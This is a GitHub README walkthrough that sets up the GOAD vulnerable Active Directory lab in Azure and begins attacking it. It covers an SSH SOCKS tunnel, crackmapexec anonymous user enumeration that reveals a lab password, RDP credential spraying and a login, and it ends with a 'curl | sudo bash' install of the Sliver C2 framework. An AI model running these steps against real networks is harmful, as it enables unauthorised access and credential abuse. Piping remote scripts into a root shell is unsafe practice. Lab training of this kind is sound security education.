# GOAD-Azure-Active-Directory-Pen-Testing-Lab
Guide to setting up GOAD in Azure and spawning a Sliver Beacon Implant - Free Pen Testing Lab (30 days to smash it out 😁)

First things first we need to setup an account in Azure. This gives us a free account with $200 to spend.

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/1c1ff9de-2128-4d4d-9170-1b99e4323635)

You will need to provide a bank card for verification and to charge billing payments to but fear not, we are setting this up for free and the whole lab will be free, for 30 days anyway.

Next we need to upgrade the free account to a pay as you go account. This gives us access to more vCPUs per region and more B Series Burstable Virtual Machine Sizes to build the lab. GOAD requieres we have 12 B Series vCPUS to use which isnt default when setting up an Azure account.

Follow this link - `https://learn.microsoft.com/en-us/azure/cost-management-billing/manage/upgrade-azure-subscription`

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/6bcf993f-5143-4c58-aa41-089424e357d7)

This will happen automatically once you have followed the above. Next we need to request extra resources for your Azure Account. When an account is first created, Azure only allows you 10 vCPUs per Region and 10 BSeries vCPUs. I assume this is to prevent fraud or you unknowlingly racking up more charges than you can realistically afford.

Go to your account and search subscriptions.

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/0640636d-fe9e-41d2-8a8f-4288007631b5)

Select your subsciption and go to useage and quotas which is under `settings`

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/09d7d463-ca1c-43d0-84fe-eaf6cf23046e)

Here you can see the resource quotas you are assigned. Your vCPU per region and B Series will be 10. Mine is now 14 and 12 respectively but you will need to click `New Quata Request in the top left`

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/ffe24b86-729e-470a-8ada-104218f70328)

Now heres the lame part, you should be able to adjust the vCPUs per region straight away, the B Series in the other hand requires you opening a ticket with Microsoft. This is painless as its just a few clicks but it does take few days to get the quota adjusted.

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/bec63b31-1a14-4a48-92af-c45053465db6)

Once we have that we are good to go and can now build the GOAD Active Directory Lab in Azure.

## GOAD - Game of Active Directory 

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/22a632de-41d4-44e6-9ce8-bca93937a77a)

Built by Mayfly at Orange CyberDefense (Much appreciated Mayfly - Great Work!) it is described as
`GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.`

Here is the link - https://github.com/Orange-Cyberdefense/GOAD/tree/main

With that in mind, lets get cracking.

First we need to ensure we have Azure CLI installed. Go ahead and get that installed.

```bash
sudo apt install azure-cli
```

Here is the link for installing on Linux if needed - https://learn.microsoft.com/en-us/cli/azure/install-azure-cli-linux?pivots=apt

Now thats installed simply run `az login`

```bash
┌──(kali㉿kali)-[~/GOAD]
└─$ az login
```

This will spawn a browser session for you to authenticate to azure with your credentials. Enter your creds and then you are authenticated and can now interact with your Azure account through the command line.

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/a9092544-4f6a-4e07-bba8-e9184c12de3e)


We also need terraform installed to run the terraform script and build the lab.

```bash
# sudo apt install terraform
```

### Clone the GOAD Repo

git clone the GOAD repo over to your machine

```bash
# git clone https://github.com/Orange-Cyberdefense/GOAD.git
```
Mayfly has made the install super simple, head over to here https://github.com/Orange-Cyberdefense/GOAD/blob/main/docs/install_with_azure.md and follow the instruction. Essentially you are just running

```bash
./goad.sh -t install -l GOAD -p azure
```

Now go and make a coffee, this will take a while as all the Domain, Users, Groups, Trusts and Services etc need to be built and applied.

## Lets Gooooooooooo

Once that has finished and you havent encountered any errors you will be presented with a IP for the Ubuntu Jump Server and the location of your SSH Private Key for logging in.

Mine is at `/GOAD/ad/GOAD/providers/azure/ssh_keys` 

Move it over to your Desktop if you want and SSH in. Username is `goad`

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -i Desktop/ubuntu-jumpbox.pem goad@13.80.243.***
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-1016-azure x86_64)
```

### Recon

Running `ip add` shows us the IP assigned and the subnet we are on in the internal network. Our IP is 192.168.56.100 and subnet is 255.255.255.0

```bash
goad@ubuntu-jumpbox:~$ ip ad
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:0d:3a:af:62:51 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.100/24 metric 100 brd 192.168.56.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::20d:3aff:feaf:6251/64 scope link 
       valid_lft forever preferred_lft forever
```


Run a quick ping sweep to find some alive hosts - Im using pingMe.sh which is a quick subnet ping sweep tool I knocked up https://github.com/deeexcee-io/pingMe. Feel free to use it or any other tool you prefer.

```bash
goad@ubuntu-jumpbox:~/pingMe$ bash pingMe.sh 

[+] Scanning subnets
[+] 192.168.56.10 is up
[+] 192.168.56.100 is up
[+] 192.168.56.11 is up
[+] 192.168.56.12 is up
[+] 192.168.56.22 is up
[+] 192.168.56.23 is up
```

We have 6 Hosts return a response. 192.168.56.100 is ours so there are 5 hosts that respond to ping on the network.

Next we need to run crackmapexec. This will give us plenty of information about the hostnames and the Domains in use.

As we dont have crackmapexec installed on the ubuntu box, we could install the tools we need or, a better option in my opinion is to setup a Dynamic SSH Tunnel through the Ubuntu Box from our Kali Machine. This way we have the majority of the tools needed at our disposal and can use proxychains to forward the traffic.

First check the configuration of your proxychains file `tail /etc/proxychains4.conf`. My socks4 conf is set to 127.0.0.1 on port 1080

```bash
┌──(kali㉿kali)-[~/GOAD]
└─$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 1080
```
The port can be any port you want as long as it is not already in use. I'm going to leave mine as 1080.

Now lets setup our Dynamic SSH Tunnel. To do this we need a few options

```bash
-D 1080 - Tells SSH to setup a dymanic Tunnel, listening on Port 1080
-N      - This states we dont not wantto run a command when the tunnel is established
-f      - This forks or backgrounds the tunnel
-i      - Private key file to use
```

Here is the whole command

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -D 1080 -N -f -i ubuntu-jumpbox.pem goad@13.80.243.***
```

We can check it has worked by runnin `ss -tulpn`

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ss -tulpn                                                 
Netid  State   Recv-Q  Send-Q        Local Address:Port   Peer Address:Port Process                          
tcp    LISTEN  0       128               127.0.0.1:1080        0.0.0.0:*     users:(("ssh",pid=77870,fd=5))  
tcp    LISTEN  0       50       [::ffff:127.0.0.1]:7474              *:*                                     
tcp    LISTEN  0       128                   [::1]:1080           [::]:*     users:(("ssh",pid=77870,fd=4))  
tcp    LISTEN  0       4096     [::ffff:127.0.0.1]:7687              *:*
```

As shown, the tunnel has been established on 127.0.0.1:1080

With the hosts we found earlier in a txt file, lets give that to crackmapexec, run it over proxychains and see what we get back.

```bash
┌──(kali㉿kali)-[~/GOAD]
└─$ proxychains -q crackmapexec smb hosts.txt
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows 10.0 Build 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows 10.0 Build 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
```

So looking at the results we have 2 Domains (essos.local and devenkingdoms.local), we also have 1 subdomain (north.sevenkingdoms.local)

and also five hostnames
* WINTERFELL
* MEEREEN
* KINGSLANDING
* BRAAVOS
* CASTLEBLACK

WINTERFELL, MEEREEN and KINGSLANDING all have SMB Signing Enabled. This points to them possibly being Domain Controllers due to that being the default setting for DCs. The other 2 are potentially workstations/servers.

Lets do some more recon and see if guest access is anabled on any of the shares, unlikley to see this but it does happen.

```bash
┌──(kali㉿kali)-[~/GOAD]
└─$ proxychains -q crackmapexec smb hosts.txt -u '' -p ''
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows 10.0 Build 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows 10.0 Build 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\: 
SMB         192.168.56.12   445    MEEREEN          [+] essos.local\: 
SMB         192.168.56.23   445    BRAAVOS          [-] essos.local\: STATUS_ACCESS_DENIED 
SMB         192.168.56.10   445    KINGSLANDING     [+] sevenkingdoms.local\: 
SMB         192.168.56.22   445    CASTELBLACK      [-] north.sevenkingdoms.local\: STATUS_ACCESS_DENIED 
```

It appears that .10, .11 and .12 allow some sort of anonymous interaction.

Lets see if we can get a list of users in the Domains.

```bash
┌──(kali㉿kali)-[~/GOAD]
└─$ proxychains -q crackmapexec smb hosts.txt -u '' -p '' --users    
SMB         192.168.56.12   445    MEEREEN          [*] Windows 10.0 Build 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows 10.0 Build 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [+] essos.local\: 
SMB         192.168.56.23   445    BRAAVOS          [-] essos.local\: STATUS_ACCESS_DENIED 
SMB         192.168.56.12   445    MEEREEN          [-] Error enumerating domain users using dc ip 192.168.56.12: NTLM needs domain\username and a password
SMB         192.168.56.12   445    MEEREEN          [*] Trying with SAMRPC protocol
SMB         192.168.56.23   445    BRAAVOS          [-] Error enumerating domain users using dc ip 192.168.56.23: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
SMB         192.168.56.23   445    BRAAVOS          [*] Trying with SAMRPC protocol
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\: 
SMB         192.168.56.11   445    WINTERFELL       [-] Error enumerating domain users using dc ip 192.168.56.11: NTLM needs domain\username and a password
SMB         192.168.56.11   445    WINTERFELL       [*] Trying with SAMRPC protocol
SMB         192.168.56.22   445    CASTELBLACK      [-] north.sevenkingdoms.local\: STATUS_ACCESS_DENIED 
SMB         192.168.56.22   445    CASTELBLACK      [-] Error enumerating domain users using dc ip 192.168.56.22: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
SMB         192.168.56.22   445    CASTELBLACK      [*] Trying with SAMRPC protocol
SMB         192.168.56.10   445    KINGSLANDING     [+] sevenkingdoms.local\: 
SMB         192.168.56.10   445    KINGSLANDING     [-] Error enumerating domain users using dc ip 192.168.56.10: NTLM needs domain\username and a password
SMB         192.168.56.10   445    KINGSLANDING     [*] Trying with SAMRPC protocol
SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated domain user(s)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Guest                          Built-in account for guest access to the computer/domain
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\arya.stark                     Arya Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sansa.stark                    Sansa Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\brandon.stark                  Brandon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\rickon.stark                   Rickon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\hodor                          Brainless Giant
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jon.snow                       Jon Snow
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\samwell.tarly                  Samwell Tarly (Password : Heartsbane)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jeor.mormont                   Jeor Mormont
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sql_svc                        sql service
```

Awesome, we can get all users and there is also a password stored in the user attributes.

samwell.tarly:Heartsbane

Lets see where these can be used, I want an RDP Session as its easier to work with. Use crackmapexec with rdp and the creds.

```bash
└─$ proxychains -q crackmapexec rdp hosts.txt -u samwell.tarly -p Heartsbane
RDP         192.168.56.22   3389   CASTELBLACK      [*] Windows 10 or Windows Server 2016 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (nla:True)
RDP         192.168.56.23   3389   BRAAVOS          [*] Windows 10 or Windows Server 2016 Build 14393 (name:BRAAVOS) (domain:essos.local) (nla:True)
RDP         192.168.56.11   3389   WINTERFELL       [*] Windows 10 or Windows Server 2016 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (nla:True)
RDP         192.168.56.12   3389   MEEREEN          [*] Windows 10 or Windows Server 2016 Build 14393 (name:MEEREEN) (domain:essos.local) (nla:True)
RDP         192.168.56.10   3389   KINGSLANDING     [*] Windows 10 or Windows Server 2016 Build 17763 (name:KINGSLANDING) (domain:sevenkingdoms.local) (nla:True)
RDP         192.168.56.22   3389   CASTELBLACK      [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane (Pwn3d!)
RDP         192.168.56.23   3389   BRAAVOS          [-] essos.local\samwell.tarly:Heartsbane 
RDP         192.168.56.11   3389   WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
RDP         192.168.56.12   3389   MEEREEN          [-] essos.local\samwell.tarly:Heartsbane (STATUS_LOGON_FAILURE)
RDP         192.168.56.10   3389   KINGSLANDING     [-] sevenkingdoms.local\samwell.tarly:Heartsbane (STATUS_LOGON_FAILURE)
```
Cool, so we can RDP and samwell.tarly is also a local admin on .22 (Pwn3ed!)

Use xfreerdp ober proxychains and mount a local folder to make transferring files easy.
`proxychains xfreerdp  /drive:kali,/home/kali /u:samwell.tarly /v:192.168.56.22`

Enter Y to accept the certificate then enter the password

```bash
┌──(kali㉿kali)-[~/GOAD]
└─$ proxychains xfreerdp  /drive:kali,/home/kali /u:samwell.tarly /v:192.168.56.22
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.56.22:3389  ...  OK
[12:19:17:669] [138186:138188] [INFO][com.freerdp.crypto] - creating directory /home/kali/.config/freerdp
[12:19:17:669] [138186:138188] [INFO][com.freerdp.crypto] - creating directory [/home/kali/.config/freerdp/certs]
[12:19:17:669] [138186:138188] [INFO][com.freerdp.crypto] - created directory [/home/kali/.config/freerdp/server]
[12:19:17:774] [138186:138188] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[12:19:17:774] [138186:138188] [WARN][com.freerdp.crypto] - CN = castelblack.north.sevenkingdoms.local
[12:19:17:775] [138186:138188] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[12:19:17:775] [138186:138188] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[12:19:17:775] [138186:138188] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[12:19:17:775] [138186:138188] [ERROR][com.freerdp.crypto] - The hostname used for this connection (192.168.56.22:3389) 
[12:19:17:776] [138186:138188] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[12:19:17:776] [138186:138188] [ERROR][com.freerdp.crypto] - Common Name (CN):
[12:19:17:776] [138186:138188] [ERROR][com.freerdp.crypto] -    castelblack.north.sevenkingdoms.local
[12:19:17:776] [138186:138188] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 192.168.56.22:3389 (RDP-Server):
        Common Name: castelblack.north.sevenkingdoms.local
        Subject:     CN = castelblack.north.sevenkingdoms.local
        Issuer:      CN = castelblack.north.sevenkingdoms.local
        Thumbprint:  31:65:cd:a1:df:f2:5f:a1:ba:7a:4e:26:e0:6b:5c:0f:f6:ca:0e:21:eb:b3:3d:e0:9f:c2:bf:52:64:a0:26:ce
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
Password: 
[12:19:26:658] [138186:138188] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Eastern
[12:19:26:861] [138186:138188] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
```

We get presented with an RDP Session. Sweet. Lets get a Sliver Beacon and go from there.

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/24222237-e783-4e64-b4ec-8c7dbe4c2ccd)

## Sliver

Free to use C2 Frameowrk. I quite like it so far.

Super easy to install just run `curl https://sliver.sh/install|sudo bash`







